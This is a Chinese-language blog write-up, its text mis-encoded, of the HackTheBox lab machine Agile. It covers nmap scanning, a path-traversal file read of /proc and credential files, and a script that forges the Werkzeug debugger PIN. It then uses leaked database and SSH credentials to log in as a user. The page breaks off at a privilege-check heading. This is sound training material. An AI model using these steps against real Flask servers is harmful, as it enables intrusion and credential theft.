<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>Agile(HTB) Â· zIxyd's Blog</title><meta name="description" content="ä¿¡æ¯æœé›†12345678910111213141516171819202122232425262728â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ sudo nmap -p- -min-rate 10000 10.10.11.203Starting Nmap 7.94 ( https://nmap.o"><meta name="keywords" content="Blog,åšå®¢,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">ä¿¡æ¯æœé›†</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toclist-text">æ–‡ä»¶è¯»å–</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#flask%E7%AE%97pin%E7%A0%81"><span class="toclist-text">flaskç®—pinç </span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-corum"><span class="toclist-text">user-corum</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Chrome%E8%B0%83%E8%AF%95"><span class="toclist-text">Chromeè°ƒè¯•</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-edwards"><span class="toclist-text">user-edwards</span></a></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>å­˜æ”¾ä¸ªäººå­¦ä¹ ç¬”è®°çš„å°çªï¼Œæ¬¢è¿äº¤æµ</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">ä¿¡æ¯æœé›†</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toclist-text">æ–‡ä»¶è¯»å–</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#flask%E7%AE%97pin%E7%A0%81"><span class="toclist-text">flaskç®—pinç </span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-corum"><span class="toclist-text">user-corum</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Chrome%E8%B0%83%E8%AF%95"><span class="toclist-text">Chromeè°ƒè¯•</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-edwards"><span class="toclist-text">user-edwards</span></a></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> å…¨ç«™CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Agile(HTB)</a></h3></div><div class="post-content"><p><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ sudo nmap -p- -min-rate 10000 10.10.11.203</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 10:50 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> superpass.htb (10.10.11.203)</span><br><span class="line">Host is up (0.091s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.87 seconds</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ sudo nmap -sT -sV -sC -O -p80 10.10.11.203</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 10:52 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> superpass.htb (10.10.11.203)</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: SuperPassword \xF0\x9F\xA6\xB8</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯¹ç›®å½•ï¼Œå’Œå­åŸŸåæœé›†æ— æœåï¼Œç›´æ¥è®¿é—®80;</p>
<h2 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h2><p>éšæ„æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå¹¶ç™»å½•ï¼›åœ¨<code>/vault</code>ä¸‹æœ‰ä¸€ä¸ªè®°å½•ç”¨æˆ·åå’Œå¯†ç çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥å¯¼å‡ºï¼Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125105600.png"></p>
<p>â€œå¯¼å‡ºâ€çš„http-headerçš„getè¯·æ±‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /download?fn=12345_export_9b398f27c8.csv HTTP/1.1</span><br><span class="line">Host: superpass.htb</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¹¶ä¸éš¾å‘ç°ï¼Œâ€å¯¼å‡ºâ€åŠŸèƒ½ç‚¹å­˜åœ¨ï¼Œç›®å½•ç©¿è¶Šå¯¼è‡´ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼›å¹¶ä¸”å¯ä»¥çœ‹åˆ°<code>corum</code>,<code>edwards</code>,<code>dev_admin</code>ç”¨æˆ·ä½äºâ€&#x2F;home&#x2F;â€œä¸‹ï¼›</p>
<p>å³ä½¿è¿™é‡Œå­˜åœ¨æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯ä¸çŸ¥é“æ•æ„Ÿä¿¡æ¯åˆ°è·¯å¾„ç­‰ï¼Œæ— æ³•å¾—åˆ°ç«‹è¶³ç‚¹ï¼›</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125110820.png"></p>
<h2 id="flaskç®—pinç "><a href="#flaskç®—pinç " class="headerlink" title="flaskç®—pinç "></a>flaskç®—pinç </h2><p>åœ¨æ³¨å†Œç”¨æˆ·æ—¶ï¼Œæœ‰ä¸€ä¸ªflaskçš„æŠ¥é”™ï¼›å¾—çŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªflaskåº”ç”¨ï¼›å½“æˆ‘å°è¯•é€šè¿‡æ–‡ä»¶è¯»å–æ‹¿åˆ°flaské»˜è®¤appåº”ç”¨çš„æºç æ˜¯<code>/app/app.py</code>æ—¶ï¼Œå¹¶æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œçœ‹æ¥è·¯å¾„æ²¡æˆ‘æƒ³åˆ°é‚£ä¹ˆç®€å•ï¼›</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125111704.png"></p>
<p>æˆ‘è¯•ç€çœ‹çœ‹flaskçš„åŠ¨æ€è°ƒè¯•æ˜¯å¦å¼€å¯,è®¿é—®<code>/console</code>è·¯å¾„ï¼Œè¿”å›çš„æ˜¯ï¼šâ€404 Not Foundâ€;æˆ‘ä»¥å‰éƒ½æ˜¯è¿™æ ·æŸ¥çœ‹flaskçš„åŠ¨æ€è°ƒè¯•æ˜¯å¦ä¸ºå¼€å¯çŠ¶æ€çš„ï¼›æˆ‘è‡ªä»¥ä¸ºè®¿é—®<code>/console</code>æ²¡æœ‰å›æ˜¾å°±æ˜¯åŠ¨æ€è°ƒè¯•ä¸ºå…³é—­ï¼›å®æ—¶è¯æ˜æˆ‘æ˜¯å¤šä¹ˆæ„šè ¢ï¼›</p>
<p>åœ¨æŠ¥é”™é¡µé¢ï¼Œç‚¹å‡»å³ä¾§çš„å°çª—å£å³ï¼Œå°±ä¼šå¼¹å‡ºè¦æ±‚è¾“å…¥pinçš„æ¡†</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125112201.png"></p>
<p>æ‰“ctfæ‰“å¤šäº†çš„ï¼Œä¸€ä¸‹å°±æƒ³åˆ°äº†â€æ–‡ä»¶è¯»å–â€+â€pinç â€ï¼›å¾ˆæ˜æ˜¾éœ€è¦æˆ‘ä»¬é€šè¿‡æ–‡ä»¶è¯»å–ä»è€Œè®¡ç®—pinç ï¼›</p>
<p>åœ¨<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#probably_public_bits">hacktricks</a>ä¸Šæœ‰ä¸€ç¯‡å…³äºè®¡ç®—pinç çš„æ–‡ç« ï¼Œå€¼å¾—ä¸€çœ‹ï¼›</p>
<p>flaskçš„pinç è®¡ç®—ï¼Œæ ¹æ®ç¯å¢ƒå’Œç‰ˆæœ¬çš„ä¸åŒï¼Œè®¡ç®—çš„æ–¹å¼ä¸åŒã€‚æ€ä¹ˆç¡®å®šç”¨é‚£ç§æ–¹å¼å‘¢ï¼Ÿåœ¨è¿™å°é¶æœºä¸­æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ–‡ä»¶è¯»å–æ¥æŸ¥çœ‹è¿™å°æœºå™¨è®¡ç®—pinç çš„æºç </p>
<p><code>/app/venv/lib/python3.10</code>æ˜¯æ ¹æ®æŠ¥é”™é¡µé¢å¾—åˆ°çš„ï¼Œ<code>site-packages/werkzeug/debug/__init__.py</code>åˆ™æ˜¯å›ºå®šè·¯å¾„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125113438.png"></p>
<p>æºç å¤ªé•¿,åªè´´ä¸€éƒ¨åˆ†ï¼Œä»ä¸­å¯ä»¥çœ‹å‡ºæ˜¯ä»¥<code>sha1</code>çš„æ–¹å¼è®¡ç®—çš„ï¼Œæˆ‘ä»¬å¯¹åº”çš„è„šæœ¬ä¹Ÿåº”è¯¥ç”¨sha1;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">    username,</span><br><span class="line">    modname,</span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">    <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br></pre></td></tr></table></figure>

<p><code>username</code> æ˜¯å¯åŠ¨æ­¤FLASKçš„ç”¨æˆ·ï¼›æœ‰ä¸€ä¸ªæ¯”è¾ƒèªæ˜çš„åŠæ³•ï¼Œé€šè¿‡ç¯å¢ƒå˜é‡<code>/proc/self/environ</code>ï¼Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125114544.png"></p>
<p>å¦‚æœç¯å¢ƒå˜é‡ä¸­æ²¡æœ‰ï¼Œé‚£å°±ä¼°è®¡åªèƒ½æ³„éœ²<code>/etc/passwd</code>ä¸€ä¸ªä¸€ä¸ªè¯•äº†</p>
<p><code>modname</code> is flask.app</p>
<p><code>getattr(app, &quot;__name__&quot;, type(app).__name__)</code>è¿™é‡Œçš„ç¬¬ä¸‰ä¸ªå€¼é»˜è®¤çš„<code>Flask</code>ï¼Œä½†æƒ…å†µå¹¶éæ€»æ˜¯å¦‚æ­¤;è€Œæ˜¯â€™wsgi_appâ€™;è¿™ä¸ Flask åœ¨ä¸»æœºä¸Šçš„å¯åŠ¨æ–¹å¼æœ‰å…³ã€‚</p>
<p>è¿™ä¸€ç‚¹å¯ä»¥é€šè¿‡<code>/proc/self/cmdline</code>ï¼›cmdline æ–‡ä»¶å­˜å‚¨ç€å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼Œä½†åƒµå°¸è¿›ç¨‹ç›®å½•ä¸­çš„æ­¤æ–‡ä»¶ä¸åŒ…å«ä»»ä½•ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cmdlineç›®å½•è·å–å¯åŠ¨æŒ‡å®šè¿›ç¨‹çš„å®Œæ•´å‘½ä»¤</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125115109.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/venv/bin/python3 /app/venv/bin/gunicorn --<span class="built_in">bind</span> 127.0.0.1:5000 --threads=10 --<span class="built_in">timeout</span> 600 wsgi:app</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‘½ä»¤çš„æ„æ€æ˜¯ä½¿ç”¨Pythonè™šæ‹Ÿç¯å¢ƒä¸­çš„Python 3è§£é‡Šå™¨æ¥è¿è¡ŒGunicornæœåŠ¡å™¨ï¼Œç»‘å®šåˆ°æœ¬åœ°çš„5000ç«¯å£ï¼Œä½¿ç”¨10ä¸ªçº¿ç¨‹å¤„ç†è¯·æ±‚ï¼Œå¹¶è®¾ç½®è¯·æ±‚è¶…æ—¶æ—¶é—´ä¸º600ç§’ï¼ŒåŒæ—¶è¿è¡Œåä¸ºappçš„WSGIåº”ç”¨ç¨‹åº;</p>
<p><code>getattr(mod, &#39;__file__&#39;, None)</code> æ˜¯Flaskç›®å½•ä¸­<code>app.py</code>çš„ç»å¯¹è·¯å¾„ï¼Œé€šè¿‡æŠ¥é”™é¡µé¢å¾—çŸ¥ï¼›</p>
<p><code>uuid.getnode()</code>æ˜¯<strong>å½“å‰è®¡ç®—æœºçš„MACåœ°å€</strong>ï¼Œ<code>str(uuid.getnode())</code>æ˜¯macåœ°å€çš„åè¿›åˆ¶è¡¨è¾¾ã€‚</p>
<p>è¦<strong>æŸ¥æ‰¾æœåŠ¡å™¨ MAC åœ°å€</strong>ï¼Œéœ€è¦çŸ¥é“<strong>æ­£åœ¨ä½¿ç”¨å“ªä¸ªç½‘ç»œæ¥å£</strong>æ¥ä¸ºåº”ç”¨ç¨‹åºæä¾›æœåŠ¡ï¼ˆä¾‹å¦‚<code>eth0</code>ï¼‰ã€‚å¦‚æœæœªçŸ¥ï¼Œåˆ™<strong>æ³„æ¼</strong><code>/proc/net/arp</code>è®¾å¤‡ IDï¼Œç„¶å<strong>æ³„æ¼</strong>MAC åœ°å€<code>/sys/class/net/&lt;device id&gt;/address</code>ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125115642.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125120000.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int(<span class="string">&quot;00:50:56:b9:1e:a9&quot;</span>.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),16) </span><br><span class="line">345052356265</span><br></pre></td></tr></table></figure>

<p><code>get_machine_id()</code>åœ¨æºç ä¸­æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯æ”¾å›â€&#x2F;etc&#x2F;machine-idâ€æˆ–è€…â€&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_idâ€ä¹‹ä¸­ä¸€ä¸ª(machine-idæ›´ä¼˜å…ˆ)ï¼Œå’Œâ€&#x2F;proc&#x2F;self&#x2F;cgroupâ€çš„å€¼ä»¥<code>/</code>åˆ†å‰²çš„ç¬¬ä¸€ä¸ªæ”¾å›å€¼ï¼Œè¿™ä¸€ç‚¹å¯èƒ½è¡¨è¾¾çš„ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œè‡ªå·±çœ‹çœ‹æºç å°±æ‡‚äº†ï¼›</p>
<p>è´´äº†<code>get_machine_id()</code>å‡½æ•°ä¸­çš„ä¸€éƒ¨åˆ†ä»£ç ï¼›</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            value = f.readline().strip()</span><br><span class="line">    <span class="keyword">except</span> OSError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> value:</span><br><span class="line">        linux += value</span><br><span class="line">        <span class="keyword">break</span><span class="comment">#è¿™é‡Œæœ‰ä¸€ä¸ªbreak,å¦‚æœå¯ä»¥æ‹¿åˆ°&quot;/etc/machine-id&quot;å°±ä¼šé€€å‡º</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span> OSError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> linux:</span><br><span class="line">    <span class="keyword">return</span> linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125121337.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125121257.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;www-data&#x27;</span>  </span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;wsgi_app&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;/app/venv/lib/python3.10/site-packages/flask/app.py&#x27;</span>  </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;345052356265&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span></span><br><span class="line">    <span class="string">&#x27;ed5b159560f54721827644bc9b220d00superpass.service&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125205515.png"></p>
<h2 id="user-corum"><a href="#user-corum" class="headerlink" title="user-corum"></a>user-corum</h2><p>å‘ç°æ•æ„Ÿæ–‡ä»¶ï¼Œå…¶å®åœ¨&#x2F;appç›®å½•ä¸‹ä¹Ÿåªæœ‰config_prod.jsonæ–‡ä»¶å¯¹www-dataå¯è¯»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat config_prod.json                                                                               </span><br><span class="line">&#123;&quot;SQL_URI&quot;: &quot;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼ªç»ˆç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot; </span><br></pre></td></tr></table></figure>

<p>è¿æ¥æ•°æ®åº“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -usuperpassuser -p </span><br><span class="line">password: dSA6l7q*yIVs$39Ml6ywvgK</span><br></pre></td></tr></table></figure>

<p>ä»<code>superpass.passwords</code>è¡¨ä¸­å‘ç°corumç”¨æˆ·çš„å¯†ç ï¼š5db7caa1d13cc37c9fc2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh corum@10.10.11.203</span><br><span class="line">password:5db7caa1d13cc37c9fc2</span><br></pre></td></tr></table></figure>

<p>æƒé™æ£€æŸ¥</p>
